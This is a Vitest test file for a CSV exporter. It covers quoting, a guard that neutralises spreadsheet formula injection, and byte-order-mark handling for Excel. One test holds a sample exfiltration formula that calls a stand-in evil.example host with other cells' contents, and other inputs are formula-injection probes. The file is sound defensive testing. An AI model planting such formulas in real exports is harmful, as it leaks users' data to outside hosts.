import { describe, expect, it } from 'vitest';
import { toCsv } from './csv';
import { csvCell, parseCsv, toCsv as utilsToCsv, withByteOrderMark } from './utils/csv';

describe('toCsv', () => {
  it('writes headers and rows', () => {
    expect(toCsv(['a', 'b'], [[1, 'x'], [2, null]])).toBe('a,b\r\n1,x\r\n2,\r\n');
  });
  it('quotes commas, quotes and newlines', () => {
    expect(toCsv(['n'], [['Smith, J'], ['say "hi"'], ['a\nb']])).toBe('n\r\n"Smith, J"\r\n"say ""hi"""\r\n"a\nb"\r\n');
  });
  it('defuses spreadsheet formulas but keeps negative numbers', () => {
    expect(toCsv(['n'], [['=SUM(A1)'], ['@cmd'], [-5]])).toBe("n\r\n'=SUM(A1)\r\n'@cmd\r\n-5\r\n");
  });
  it('is the same function whichever file it is imported from', () => {
    expect(toCsv).toBe(utilsToCsv);
  });
});

describe('the formula guard (R24)', () => {
  it.each(['=1+1', '+1', '-1+1', '@SUM(A1)', '\tcmd', '\rcmd'])('prefixes a text cell that starts with %j', (value) => {
    const cell = csvCell(value);
    // A prefixed cell may also need quoting (a carriage return forces quotes), so look past an opening quote.
    expect(cell.replace(/^"/, '').startsWith("'")).toBe(true);
  });

  it('prefixes the formula that would send other cells off-site', () => {
    const evil = '=IMAGE("https://evil.example/?d="&B2&B3)';
    const csv = toCsv(['Name', 'Email'], [[evil, 'a@example.com']]);
    expect(csv).toBe(`Name,Email\r\n"'=IMAGE(""https://evil.example/?d=""&B2&B3)",a@example.com\r\n`);
  });

  it('guards every column of a roster-shaped export, not just the first', () => {
    const csv = toCsv(
      ['Name', 'Email', 'Plan'],
      [['+Mallory', '-x@example.com', '@plan']]
    );
    expect(csv.split('\r\n')[1]).toBe("'+Mallory,'-x@example.com,'@plan");
  });

  it('leaves ordinary text and numbers alone, including negative numbers', () => {
    expect(csvCell('Alex Smith')).toBe('Alex Smith');
    expect(csvCell(-3)).toBe('-3');
    expect(csvCell(0)).toBe('0');
    expect(csvCell('2 - 3')).toBe('2 - 3');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('still reads back what it wrote (the quote prefix is plain text for the importer)', () => {
    const csv = toCsv(['Name', 'Note'], [['Smith, J', 'say "hi"'], ['=A1', 'plain']]);
    expect(parseCsv(csv)).toEqual([
      ['Name', 'Note'],
      ['Smith, J', 'say "hi"'],
      ["'=A1", 'plain'],
    ]);
  });
});

describe('the byte-order mark (R24)', () => {
  it('is added to CSV downloads so Excel reads accents', () => {
    expect(withByteOrderMark('Zoë\r\n', 'text/csv;charset=utf-8;')).toBe('﻿Zoë\r\n');
  });
  it('is not added twice', () => {
    expect(withByteOrderMark('﻿a', 'text/csv')).toBe('﻿a');
  });
  it('is never added to JSON or other files', () => {
    expect(withByteOrderMark('{"a":1}', 'application/json')).toBe('{"a":1}');
    expect(() => JSON.parse(withByteOrderMark('{"a":1}', 'application/json'))).not.toThrow();
  });
});
